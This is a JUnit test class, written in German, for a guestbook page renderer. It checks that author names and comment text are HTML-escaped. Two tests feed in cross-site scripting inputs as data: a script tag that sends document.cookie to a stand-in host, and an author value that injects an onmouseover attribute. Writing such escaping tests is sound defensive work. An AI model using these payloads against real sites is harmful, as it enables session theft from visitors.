package de.makno.lernen;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.List;
import org.junit.jupiter.api.Test;

class GaestebuchSeiteTest {

    private final GaestebuchSeite seite = new GaestebuchSeite();

    @Test
    void zeigtAutorUndText() {
        String html = seite.html(List.of(new Kommentar("Anna", "Schöne Seite!")));

        assertEquals("<ul class=\"gaestebuch\">\n  <li title=\"von Anna\">Schöne Seite!</li>\n</ul>\n", html);
    }

    @Test
    void skriptImTextWirdAlsTextGezeigtNichtAusgefuehrt() {
        String html = seite.html(List.of(new Kommentar("Ben", "<script>document.location='http://boese.example/?k='+document.cookie</script>")));

        assertFalse(html.contains("<script>"), "Das Skript steht als Element im HTML – der Browser führt es aus:\n" + html);
        assertTrue(html.contains("&lt;script&gt;"), "Die spitzen Klammern müssen als Text maskiert sein:\n" + html);
    }

    @Test
    void anfuehrungszeichenImAutorKoennenDasAttributNichtVerlassen() {
        String html = seite.html(List.of(new Kommentar("Eva\" onmouseover=\"alert(1)", "Hallo")));

        assertFalse(html.contains("\" onmouseover="), "Der Autor hat das title-Attribut verlassen und ein Event-Attribut ergänzt:\n" + html);
        assertEquals(1, html.split("title=", -1).length - 1, "genau ein title-Attribut");
    }

    @Test
    void kaufmaennischesUndBleibtLesbar() {
        String html = seite.html(List.of(new Kommentar("Anna", "Tom & Jerry")));

        assertTrue(html.contains("Tom &amp; Jerry"), "& muss als &amp; erscheinen, sonst ist es ungültiges HTML:\n" + html);
    }
}
